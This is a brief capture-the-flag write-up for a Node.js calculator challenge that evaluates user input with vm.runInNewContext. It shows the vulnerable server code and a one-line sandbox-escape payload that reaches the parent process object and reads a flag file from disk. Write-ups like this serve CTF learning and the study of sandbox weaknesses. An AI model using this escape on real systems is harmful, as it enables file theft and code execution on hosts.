## Owner:

> CaptainFreak

#### Solved?

 -Yes

#### Tried:

Escaping Node and accessing parenting objects

#### Solutions:

Usefull references:

1. https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af#file-escape-js-L64

2. https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html


Challenges had following code:

```javascript
const vm = require('vm')
const readline = require('readline')

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

process.stdout.write('Welcome to my Calculator-as-a-Service (CaaS)!\n')
process.stdout.write('This calculator lets you use the full power of Javascript for\n')
process.stdout.write('your computations! Try `Math.log(Math.expm1(5) + 1)`\n')
process.stdout.write('Type q to exit.\n')
rl.prompt()
rl.addListener('line', (input) => {
  if (input === 'q') {
    process.exit(0)
  } else {
    try {
      console.log(input)
      const result = vm.runInNewContext(input)
      process.stdout.write(result + '\n')
    } catch(e) {
      console.log(e)
      process.stdout.write('An error occurred.\n')
    }
    rl.prompt()
  }
})
```


3. Payload that escapes and gets reference to process object of parent:
```
this.constructor.constructor('return this.process')().mainModule.require('fs').readFileSync('/ctf/flag.txt',{encoding:'utf8',flag:'r'})
```








